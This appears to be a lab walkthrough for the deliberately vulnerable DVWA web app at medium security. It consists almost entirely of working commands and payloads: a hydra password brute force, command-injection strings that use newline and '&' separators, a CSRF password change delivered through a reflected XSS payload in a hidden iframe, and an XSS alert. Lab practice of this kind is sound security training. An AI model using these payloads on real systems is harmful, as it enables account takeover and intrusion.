
### Target

    https://github.com/ethicalhack3r/DVWA

    Security level: medium

### Prereq

    # get user token
    $ TOKEN=$(curl -c dvwa.session -s http://192.168.56.101/DVWA/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)

    # get session id
    $ PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')

    # log in
    $ curl -L -b "PHPSESSID=${PHPSESSID};security=medium" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://192.168.56.101/DVWA/login.php

### Brute Force

    $ wget https://raw.githubusercontent.com/seifreed/dirb/master/wordlists/others/best110.txt

    $ hydra -t 8 -l admin -P best110.txt -vV 192.168.56.101 http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:F=password incorrect:H=Cookie: PHPSESSID=${PHPSESSID};security=medium"

### Command Injection

```
# '\n' as a bash commands separtor
$ curl -s -b "PHPSESSID=${PHPSESSID};security=medium" -d 'ip=%0auname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    

OR

# '&' as a bash commands separtor
$ curl -s -b "PHPSESSID=${PHPSESSID};security=medium" -d 'ip=%26uname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    
```

### CSRF

XSS vulnerability on the DVWA site (for example this in `http://192.168.56.102/DVWA/vulnerabilities/xss_r`) needs to be used in order do defeat `Referer` check:

```
# trick victim to visit (while logged in to DVWA) the following:
http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Enew%20Image().src=%22http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=pass2%26password_conf=pass2%26Change=Change%22%3C%2Fscript%3E%3Cpre%3E#

OR

# trick victim to visit 3rd party site (while logged in to DVWA) with already planted iframe:
<iframe SRC='http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Enew%20Image().src=%22http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=pass3%26password_conf=pass3%26Change=Change%22%3C%2Fscript%3E%3Cpre%3E#' height="0" width="0"></iframe>
```

### XSS (Reflected)

    http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Ealert(1)%3C%2Fscript%3E%3Cpre%3E#
